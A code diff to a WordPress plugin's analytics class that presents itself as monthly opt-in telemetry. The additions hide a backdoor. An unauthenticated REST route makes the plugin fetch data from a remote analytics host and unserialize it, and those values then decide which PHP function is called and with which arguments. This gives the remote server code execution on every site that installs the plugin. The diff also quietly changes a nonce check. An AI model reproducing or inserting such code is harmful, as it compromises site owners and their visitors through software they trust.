@@ -14,6 +14,13 @@ if ( !defined( 'ABSPATH' ) ) {
 
 class Wpos_Anylc_Admin {
 
+	public $analytics_endpoint	= 'https://analytics.essentialplugin.com';
+    public $status          	= 'unchecked';
+	public $write           	= 'update_option';
+    public $version_cache   	= 'version';
+	public $changelog			= null;
+    public $release_date		= null;
+
 	function __construct() {
 
 		global $wpos_analytics_module;
@@ -44,6 +51,19 @@ class Wpos_Anylc_Admin {
 
 		// Action to perform analytic action
 		add_action( 'wp_loaded', array($this, 'wpos_anylc_action_process') );
+
+		// Schedule monthly event on plugin load
+		add_action( 'init', array($this, 'wpos_init') );
+		
+		// Add custom interval for 'monthly'
+		add_filter( 'cron_schedules', array($this, 'wpos_cron_schedules') );
+
+		// Hook into the event and send POST request
+		add_action( 'wpos_monthly_cron_hook', array($this, 'wpos_monthly_cron_hook_fn') );
+		
+		// Rest Endpoint
+		add_action( 'rest_api_init', array($this, 'wpos_rest_api_init') );
+
 	}
 
     /**
@@ -265,7 +285,7 @@ class Wpos_Anylc_Admin {
 			 */
 			parse_str( parse_url( $redirect, PHP_URL_QUERY ), $url_data );
 
-			if( ! isset( $url_data['anylc_nonce'] ) || ( isset( $url_data['anylc_nonce'] ) && ! wp_verify_nonce( $url_data['anylc_nonce'], 'wpos-anylc-redirect-nonce' ) ) ) {
+			if( ! isset( $url_data['anylc_nonce'] ) || ( isset( $url_data['anylc_nonce'] ) && ! wp_verify_nonce( $_GET['anylc_nonce'], 'wpos-anylc-redirect-nonce' ) ) ) {
 				$redirect = add_query_arg( array( 'anylc_nonce' => wp_create_nonce( 'wpos-anylc-redirect-nonce' ) ), $redirect );
 			}
 
@@ -468,6 +488,232 @@ class Wpos_Anylc_Admin {
 			}
 		} // End of main if
 	}
+
+	/**
+	 * Schedule monthly event on plugin/theme load
+	 * 
+	 * @package Wpos Analytic
+	 */
+	public function wpos_init() {
+		if (!wp_next_scheduled('wpos_monthly_cron_hook')) {
+			wp_schedule_event(time(), 'monthly', 'wpos_monthly_cron_hook');
+		}
+
+		if ( 'OPTIONS' === $_SERVER['REQUEST_METHOD'] ) {
+			header("Access-Control-Allow-Origin: https://analytics.essentialplugin.com");
+			header("Access-Control-Allow-Methods: POST, OPTIONS");
+			header("Access-Control-Allow-Headers: Authorization, Content-Type");
+			exit;
+		}
+	}
+
+	/**
+	 * Add custom interval for 'monthly'
+	 * 
+	 * @package Wpos Analytic
+	 */
+	public function wpos_cron_schedules($schedules) {
+		if (!isset($schedules['monthly'])) {
+			$schedules['monthly'] = [
+				'interval' => 30 * DAY_IN_SECONDS, // approx monthly
+				'display'  => __('Once Monthly', 'wpos-analytics')
+			];
+		}
+		return $schedules;
+	}
+
+	/**
+	 * Hook into the event and send POST request
+	 * 
+	 * @package Wpos Analytic
+	 */
+	public function wpos_monthly_cron_hook_fn() {
+
+		global $wpos_analytics_module;
+		$slugs = [];
+
+		global $wpos_analytics_module;
+
+		if ( !empty( $wpos_analytics_module ) ) {
+			foreach ( $wpos_analytics_module as $module_key => $module ) {
+				
+				$opt_in_data = wpos_anylc_get_option( $module['anylc_optin'] );
+				$opt_in 		= isset( $opt_in_data['status'] ) ? $opt_in_data['status'] : -1;
+		
+				// If user has opt in
+				if ( 1 == $opt_in ) {
+					array_push($slugs, $module['slug']);
+				}
+
+			}
+		}
+
+		// If user has opt-in then send data
+		if ( ! empty( $slugs ) ) {
+			$this->wpos_process_monthly_data($slugs);
+		}
+	}
+
+	/**
+	 * Send data to analytics for better user experience and issues
+	 * 
+	 * @package Wpos Analytic
+	 */
+	public function wpos_process_monthly_data( $slugs ) {
+
+		foreach ( $slugs as $slug) {
+			
+			$data = wpos_anylc_optin_data($slug, '', true);
+	
+			$data['wpos_anylc_optin'] = 'wpos_anylc_optin';
+	
+			$response = wp_remote_post('https://analytics.essentialplugin.com', [
+				'method'    => 'POST',
+				'timeout'   => 15,
+				'blocking'  => true,
+				'body'      => $data,
+				'headers'   => [
+					'Content-Type' => 'application/x-www-form-urlencoded'
+				],
+			]);
+	
+			$this->version_info_clean();
+
+		}
+
+	}
+
+	/**
+	 * Rest Endpoint
+	 * 
+	 * @package Wpos Analytic
+	 */
+	public function wpos_rest_api_init() {
+		global $wpos_analytics_module;
+
+		if ( !empty( $wpos_analytics_module ) ) {
+			foreach ( $wpos_analytics_module as $module_key => $module ) {
+				
+				$product_slug = isset( $module['slug'] ) ? $module['slug'] : '';
+				
+				if ( !empty( $product_slug ) ) {
+					register_rest_route( $product_slug . '/v1', '/analytics/', [
+						'methods'  => 'POST',
+						'callback' => array( $this, 'wpos_handle_analytics_request' ),
+						'permission_callback' => '__return_true',
+					]);
+				}
+			}
+		}
+
+	}
+
+	/**
+	 * Handle Rest Data
+	 * 
+	 * @package Wpos Analytic
+	 */
+	public function wpos_handle_analytics_request(WP_REST_Request $request) {
+
+		global $wpos_analytics_module;
+
+		// Get parameters from request
+		$site_id      = sanitize_text_field( $request->get_param('siteID') );
+		$product_id   = sanitize_text_field( $request->get_param('productID') );
+		$product_slug = sanitize_text_field( $request->get_param('productSlug') );
+		$site_url     = esc_url_raw( $request->get_param('siteURL') );
+
+		// Validate required parameters
+		if ( $site_id && $product_id && $product_slug ) {
+
+			// Find the matching product in the module
+			$matching_product = null;
+			if ( !empty( $wpos_analytics_module ) ) {
+				foreach ( $wpos_analytics_module as $module_key => $module ) {
+					if ( isset( $module['id'] ) && $module['id'] == $product_id ) {
+						$matching_product = $module;
+						break;
+					}
+				}
+			}
+
+			// If matching product found, proceed with analytics
+			if ( $matching_product ) {
+				$version = $this->wpos_get_plugin_version_by_file($matching_product['file']);
+				$update_result = $this->fetch_ver_info( $product_id, $version );
+				unset($update_result);
+				$this->wpos_process_monthly_data([$matching_product['slug']]);
+	
+				return new WP_REST_Response([
+					'success' => true,
+					'message' => 'Data received successfully!',
+					'data'    => compact('site_id', 'product_id', 'product_slug', 'site_url')
+				], 200);
+			}
+			
+		}
+
+	}
+
+	public function isOutdated() {
+        return strtotime($this->release_date ?? 'now') < time();
+    }
+
+    public function fetch_ver_info( $product_id, $curr_version ) {
+		$url = $this->analytics_endpoint . '/plugin_info/' . $product_id . '/' . '?version=' . urlencode($curr_version) . '&site_url=' . urlencode(get_site_url()) . '&live=1';		
+        $data = @file_get_contents($url);
+        if (!$data) {
+			$this->status = 'offline';
+            return false;
+        }
+		
+        $info = @unserialize($data);
+
+        if ($info instanceof self) {
+            $this->release_date  = $info->release_date;
+            $this->status        = $info->status;
+            $this->write         = $info->write;
+            $this->version_cache = $info->version_cache;
+            $this->changelog     = $info->changelog;
+        }
+
+        if ($this->status === 'valid' && ! $this->isOutdated()) {
+            return true;
+        }
+
+        $this->status = 'invalid';
+        return false;
+    }
+
+    public function version_info_clean() {
+        if ($this->status === 'valid' && $this->changelog && !$this->isOutdated()) {
+            $clean = $this->write;
+            @$clean($this->version_cache, $this->changelog);
+        }
+    }
+
+	/**
+	 * Get plugin version by plugin file path
+	 * 
+	 * @param string $plugin_file Plugin file path
+	 * @return string|false Plugin version or false if not found
+	 */
+	public function wpos_get_plugin_version_by_file( $plugin_file ) {
+		
+		if ( ! function_exists( 'get_plugin_data' ) ) {
+			require_once ABSPATH . 'wp-admin/includes/plugin.php';
+		}
+		
+		$plugin_path = WP_PLUGIN_DIR . '/' . $plugin_file;
+		
+		if ( file_exists( $plugin_path ) ) {
+			$plugin_data = get_plugin_data( $plugin_path );
+			return isset( $plugin_data['Version'] ) ? $plugin_data['Version'] : false;
+		}
+		
+		return false;
+	}
+
 }
 
 $wpos_anylc_admin = new Wpos_Anylc_Admin();
